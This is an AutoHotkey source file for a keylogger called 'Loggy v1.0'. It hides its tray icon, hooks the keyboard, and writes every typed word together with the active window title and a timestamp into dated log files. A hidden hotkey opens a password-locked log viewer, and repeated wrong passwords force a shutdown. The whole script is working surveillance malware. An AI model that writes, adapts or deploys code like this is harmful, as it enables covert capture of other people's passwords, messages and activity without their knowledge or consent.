#NoEnv
#Persistent
#InstallKeybdHook
#notrayicon

ww=2
oldtitle=nothing

IniRead, password, %A_programfile%\Main.ini, section1, key
IniRead, folderlocation, %A_programfile%\Main.ini, section2, key

if folderlocation = error
{
FileSelectFolder, OutputVar, , 3, Welcome`nit seems this is your first time loading this program. `nWhere would you want the log files to be saved?
if OutputVar =
    {
msgbox, Error!
FileDelete, %A_programfile%\Main.ini    
reload  
return 
    }
else
    {
IniWrite, %OutputVar%, %A_programfile%\Main.ini, section2, key
IniRead, folderlocation, %A_programfile%\Main.ini, section2, key     
    }

InputBox, pw, Password,You also need to setup a password to view logs,,240, 200,,,,
if ErrorLevel
    {
msgbox, Error!
FileDelete, %A_programfile%\Main.ini    
reload   
    }
else
{
IniWrite, %pw%, %A_programfile%\Main.ini, section1, key
IniRead, password, %A_programfile%\Main.ini, section1, key

msgbox,4,, Log floder location has been set to:`n%folderlocation%  `n`nPassword has been changed to:`n%password%`n`nCorrect?   
IfMsgBox No
{
FileDelete, %A_programfile%\Main.ini  
reload
}  
    
}}

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;Log Function;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

Loop
{

 Input, UserInput, V C,{enter}{esc}{Space}{tab}{Home}{End}{Left}{Right}{Up}{Down}
 tvar:=Errorlevel
 WinGetActiveTitle, watitle
 if (watitle != oldtitle and watitle != "")
{ 
 FileAppend, `n|`n%A_MM%/%A_DD%/%A_YYYY% %A_hour%:%A_min%-------- %watitle%`n, %folderlocation%\%A_MM%-%A_DD%-%A_YYYY%.ani
 oldtitle = %watitle% 
}
 IfInString, tvar, EndKey:
{
 StringSplit,endkey,tvar,`:
 if endkey2=Enter
FileAppend, %UserInput%`n, %folderlocation%\%A_MM%-%A_DD%-%A_YYYY%.ani
 else if endkey2=Space
FileAppend, %UserInput%%A_space%, %folderlocation%\%A_MM%-%A_DD%-%A_YYYY%.ani
 else if endkey2=tab
FileAppend, %UserInput%%A_space%[tab]%A_space%, %folderlocation%\%A_MM%-%A_DD%-%A_YYYY%.ani
}

}
return


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;Display Log Function;;;;;;;;;;;;;;;;;;;;;;;;;;

^k::
sleep 2000
GetKeyState, state, k
if state = U
return

Gui, destroy
InputBox, pw, Password, ,hide ,240, 100,,,,10
if ErrorLevel
return
else
{
IniRead, password, %A_programfile%\Main.ini, section1, key 
if pw != %password%
{
ww--
 if ww < 0
{
shutdown,2
return
}
sw := ww + 1
msgbox, Wrong Password`nYou have %sw% chances left.
return
}
ww=2
}

redraw:
list=
Gui, +toolwindow 
Gui, Add, Edit,y1 w500 R30 ReadOnly vMyEdit, 

Loop, %A_programfiles%\log\*.ani
    list = %A_LoopFileName%|%list%
    
Gui, Add, Listbox, y1 x+10 sort w150 r15 vRowText gloadlog, %list%

Gui, Add, Button, w150 gview, View  
Gui, Add, Button, w150 gedit, Edit  
Gui, Add, Button, w150 gdelete, Delete 
Gui, Add, Button, w150 gpasswordchange, Password change  
Gui, Add, Button, w150 glogfolderchange, Log folder change    
Gui, Add, Button, w150 gclosegui, Close GUI 
Gui, Add, Text,, Loggy v1.0 - Evan    
Gui, Show
return


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;GUI Functions;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


GuiClose:
Gui,destroy
return
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
loadlog:
if A_GuiEvent = doubleclick
{
    gui, submit, NoHide   
    FileRead, Contents, %folderlocation%\%RowText%
    StringReplace, Contents, Contents, %A_SPACE%%A_SPACE%%A_SPACE%,, All
    StringReplace, Contents, Contents, %A_SPACE%%A_SPACE%,%A_SPACE%, All
    StringReplace, Contents, Contents, `r`n`r`n`r`n,, All
    StringReplace, Contents, Contents, `r`n`r`n,`n, All
    GuiControl,, MyEdit, %Contents%
    FileDelete, %folderlocation%\%RowText%
    FileAppend, %Contents%, %folderlocation%\%RowText%
    contents=
}
return
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
view: 
    gui, submit, NoHide   
    FileRead, Contents, %folderlocation%\%RowText%
    StringReplace, Contents, Contents, %A_SPACE%%A_SPACE%%A_SPACE%,, All
    StringReplace, Contents, Contents, %A_SPACE%%A_SPACE%,%A_SPACE%, All
    StringReplace, Contents, Contents, `r`n`r`n`r`n,, All
    StringReplace, Contents, Contents, `r`n`r`n,`n, All
    GuiControl,, MyEdit, %Contents%
    FileDelete, %folderlocation%\%RowText%
    FileAppend, %Contents%, %folderlocation%\%RowText%
    contents=
return
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
edit:
gui, submit, NoHide 
Run, %folderlocation%\%RowText%
return
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
delete:
gui, submit, NoHide
FileDelete,%folderlocation%\%RowText%
gui,destroy
goto, redraw
return
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
passwordchange:
InputBox, pw, Password,,,240, 100,,,,
if ErrorLevel
return
else
{
IniWrite, %pw%, %A_programfile%\Main.ini, section1, key
IniRead, password, %A_programfile%\Main.ini, section1, key
msgbox, Password has been changed to:`n%password%
}
return
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
logfolderchange:
FileSelectFolder, OutputVar, , 3
if OutputVar =
    return
else
    {
IniWrite, %OutputVar%, %A_programfile%\Main.ini, section2, key
IniRead, folderlocation, %A_programfile%\Main.ini, section2, key
msgbox, Log floder location has been changed to:`n%folderlocation%     
gui,destroy
goto, redraw   
    }
return
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
closegui:
Gui,destroy
return
